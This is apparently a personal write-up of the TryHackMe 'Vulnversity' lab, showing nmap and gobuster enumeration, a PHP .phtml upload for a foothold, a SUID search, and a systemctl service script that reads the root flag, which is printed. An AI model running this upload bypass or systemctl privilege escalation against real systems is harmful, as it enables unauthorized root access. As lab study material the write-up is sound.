#TryHackMe #linux 
# Enum
## Nmap
┌──(root㉿kali)-[~]
└─# nmap -sC -sV vuln.thm                         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 12:23 EDT
Nmap scan report for vuln.thm (10.10.224.205)
Host is up (0.48s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2023-04-26T12:24:11-04:00
| smb2-time: 
|   date: 2023-04-26T16:24:12
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


## gobuster
┌──(root㉿kali)-[~]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://vuln.thm:3333/ -x php,txt,html
	/css                  (Status: 301) [Size: 309] [--> http://vuln.thm:3333/css/]
	/fonts                (Status: 301) [Size: 311] [--> http://vuln.thm:3333/fonts/]
	/images               (Status: 301) [Size: 312] [--> http://vuln.thm:3333/images/]
	/index.html           (Status: 200) [Size: 33014]
	/internal             (Status: 301) [Size: 314] [--> http://vuln.thm:3333/internal/]
	/js                   (Status: 301) [Size: 308] [--> http://vuln.thm:3333

┌──(root㉿kali)-[/home/kali/Desktop]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://vuln.thm:3333/internal/
	/css                  (Status: 301) [Size: 318] [--> http://vuln.thm:3333/internal/css/]
	/index.php            (Status: 200) [Size: 525]
	/uploads              (Status: 301) [Size: 322] [--> http://vuln.thm:3333/internal/uploads/]

# Exploit
upload php_payload.phtml in /internal 
click on uploaded payload in /internal/uploads 

# FootHold
[www-data@vulnuniversity:/$] find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
	-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
	-rwsr-xr-x 1 root root 659856 Feb 13  2019 [/bin/systemctl]

# PrivEsc
```
priv=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $priv
/bin/systemctl link $priv
/bin/systemctl enable --now $priv
```

www-data@vulnuniversity:/tmp$ cat flag
	a58ff8579f0a9270368d33a9966c7fd5
